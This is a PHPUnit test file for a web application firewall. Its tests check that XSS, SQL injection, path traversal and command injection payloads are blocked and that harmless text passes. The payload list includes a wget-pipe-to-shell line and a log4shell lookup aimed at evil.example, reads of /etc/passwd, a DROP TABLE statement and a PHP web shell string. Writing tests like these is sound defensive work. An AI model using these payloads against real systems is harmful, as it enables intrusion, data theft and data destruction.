<?php

declare(strict_types=1);

namespace AdelWAF\Tests;

final class DetectionTest extends TestCase
{
    /** @return array<string,array{0:string}> */
    public function attacks(): array
    {
        $p = [
            'xss script' => '<script>alert(1)</script>',
            'xss encoded' => '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
            'xss double encoded' => '%253Cscript%253Ealert(1)',
            'xss event' => '" onmouseover="alert(1)',
            'xss js uri' => 'javascript:alert(document.cookie)',
            'xss iframe+js' => '<iframe src="javascript:alert(1)">',
            'xss entity' => '&lt;script&gt;alert(1)&lt;/script&gt;',
            'sqli union' => "1' UNION SELECT username,password FROM users-- ",
            'sqli union comment' => '1 UNION/**/SELECT 1,2,3',
            'sqli tautology' => "' OR '1'='1",
            'sqli tautology num' => '1 OR 1=1 --',
            'sqli info schema' => '1 and (select 1 from information_schema.tables)',
            'sqli sleep' => '1 AND SLEEP(5)',
            'sqli stacked' => "1'; DROP TABLE users;--",
            'sqli outfile' => "1 into outfile '/tmp/x'",
            'sqli whitespace' => "1'\t\nUNION\n\tSELECT 1",
            'lfi traversal' => '../../../../etc/passwd',
            'lfi encoded' => '..%2f..%2f..%2fetc%2fpasswd',
            'lfi wrapper' => 'php://filter/convert.base64-encode/resource=index.php',
            'lfi win' => '..\\..\\..\\windows\\win.ini',
            'rce system' => 'system("id")',
            'rce php tag' => '<?php system($_GET["c"]); ?>',
            'rce pipe' => '; cat /etc/passwd',
            'rce log4shell' => '${jndi:ldap://evil.example/a}',
            'rce backtick chain' => '1 && wget http://evil.example/x.sh | sh',
            'rce bin sh' => '/bin/sh -c id',
        ];
        $out = [];
        foreach ($p as $name => $v) {
            $out[$name] = [$v];
        }

        return $out;
    }

    /**
     * @dataProvider attacks
     */
    public function testAttacksAreBlocked(string $payload): void
    {
        $d = $this->waf()->handle($this->req(['q' => $payload]));
        $this->assertTrue($d->blocks(), 'not blocked: ' . $payload . ' (score ' . $d->score . ')');
        $this->assertNotSame('', $d->blockId);
    }

    public function testAttackInPostAndJsonAndCookie(): void
    {
        $waf = $this->waf();
        $this->assertTrue($waf->handle($this->req([], ['comment' => '<script>alert(1)</script>'], '/', '203.0.113.9', 'POST'))->blocks());
        $this->assertTrue($waf->handle($this->req([], ['a' => ['b' => ['c' => "' UNION SELECT 1"]]], '/', '203.0.113.9', 'POST'))->blocks());
        $r = new \AdelWAF\Http\Request('GET', 'example.com', '/', '203.0.113.9', [], [], ['sid' => '<script>alert(1)</script>'], []);
        $this->assertTrue($waf->handle($r)->blocks());
    }

    public function testAttackInParameterNameIsDetected(): void
    {
        $d = $this->waf()->handle($this->req(['<script>alert(1)</script>' => '1']));
        $this->assertTrue($d->blocks());
    }

    public function testUriProbes(): void
    {
        $waf = $this->waf();
        $this->assertTrue($waf->handle($this->req([], [], '/.env'))->blocks());
        $this->assertTrue($waf->handle($this->req([], [], '/.git/config'))->blocks());
        $this->assertTrue($waf->handle($this->req([], [], '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php'))->blocks());
    }

    public function testScannerUserAgent(): void
    {
        $d = $this->waf()->handle($this->req([], [], '/', '203.0.113.9', 'GET', ['user-agent' => 'sqlmap/1.7']));
        $this->assertTrue($d->blocks());
        $this->assertSame('bot', $d->category);
    }

    /** @return array<string,array{0:string}> */
    public function benign(): array
    {
        return [
            'plain text' => ['hello world, this is a normal comment'],
            'url value' => ['https://example.org/some/page?x=1&y=2'],
            'html attr words' => ['please set href=home and src=cdn in your notes'],
            'sql words in prose' => ['please select the best option from the list and order by date'],
            'ampersand prose' => ['Tom & id card & more'],
            'single apostrophe' => ["O'Reilly's book"],
            'email' => ['john.doe+test@example.com'],
            'json-ish' => ['{"name":"john","age":30}'],
            'math' => ['1 + 1 = 2 and 3 > 2'],
            'path-like' => ['/images/2024/photo.jpg'],
            'relative dir name' => ['version 1.0.2..final'],
            'count word' => ['count(items) is a function in PHP'],
            'unicode' => ['Ñandú café 日本語'],
            'code mention' => ['use the onclick attribute carefully'],
            'long text' => [str_repeat('lorem ipsum dolor sit amet ', 60)],
            'uuid' => ['550e8400-e29b-41d4-a716-446655440000'],
        ];
    }

    /**
     * @dataProvider benign
     */
    public function testBenignInputPasses(string $value): void
    {
        $d = $this->waf()->handle($this->req(['q' => $value], ['field' => $value], '/search', '203.0.113.9', 'POST'));
        $this->assertFalse($d->blocks(), 'false positive: ' . $value . ' ' . json_encode($d->matches));
    }

    public function testExclusionSkipsRulesForParam(): void
    {
        $waf = $this->waf(['exclusions' => [['path' => '/admin/*', 'param' => 'content', 'rules' => ['xss']]]]);
        $this->assertFalse($waf->handle($this->req([], ['content' => '<script>x</script>'], '/admin/post', '203.0.113.9', 'POST'))->blocks());
        $this->assertTrue($waf->handle($this->req([], ['other' => '<script>x</script>'], '/admin/post', '203.0.113.9', 'POST'))->blocks());
        $this->assertTrue($waf->handle($this->req([], ['content' => '<script>x</script>'], '/public', '203.0.113.9', 'POST'))->blocks());
    }

    public function testPhpMyAdminCookieNoLongerBypasses(): void
    {
        $r = new \AdelWAF\Http\Request('GET', 'example.com', '/?q=' . urlencode('<script>alert(1)</script>'), '203.0.113.9', ['q' => '<script>alert(1)</script>'], [], ['phpMyAdmin' => 'x'], []);
        $this->assertTrue($this->waf()->handle($r)->blocks());
    }

    public function testRuleOverrides(): void
    {
        $waf = $this->waf(['rules' => ['disable' => ['xss-001', 'xss-007', 'xss-006']]]);
        $this->assertFalse($waf->handle($this->req(['q' => '<script>alert(1)</script>']))->blocks());
    }
}
